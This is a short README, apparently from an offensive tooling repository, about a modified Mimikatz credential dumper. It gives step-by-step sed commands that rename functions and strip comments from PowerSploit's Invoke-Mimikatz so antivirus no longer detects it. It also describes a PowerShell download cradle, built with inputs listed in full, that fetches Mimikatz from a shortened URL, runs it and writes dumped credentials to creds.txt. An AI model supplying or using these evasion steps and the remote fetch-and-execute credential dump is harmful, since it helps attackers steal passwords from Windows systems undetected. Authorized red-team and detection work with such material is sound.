# Mimikatz

## Mi.ps1

Mi.ps1 is a modified version of Mimikatz which is available at https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1

I downloaded the file an modified it with the following commands:

<pre>
sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
sed -i -e 's/ArgumentPtr/BirdIsTheWord/g' Invoke-Mimikatz.ps1
sed -i -e 's/CallDllMainSC1/UnceUnceUnce/g' Invoke-Mimikatz.ps1
sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
</pre>

At the end I renamed the file with:

<pre>
mv Invoke-Mimikatz.ps1 Mi.ps1
</pre>

This will change the bahivor of most AV scanners. The file will be no longer detected as maleware, but the execution will be still blocked when the code sucked in.

## MiLoading.ps1

Is a single command that can be run on powershell. It will pull a file from the internet containing Mimikatz and will execute it. The results will be printed into a txt file which will be opened by notepad. The commands was created by the Invoke-CradleCrafter (https://github.com/danielbohannon/Invoke-CradleCrafter). Another great tool to obfuscate the command and to execute Mimikatz is Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation).

INPUTS:
<pre>
Url: http://bit.ly/L3g1tCrad1e
Path: Default_File_Path.ps1
PostCradleCommand: Invoke-Mimikatz -DumpCr > creds.txt; notepad creds.txt
</pre>
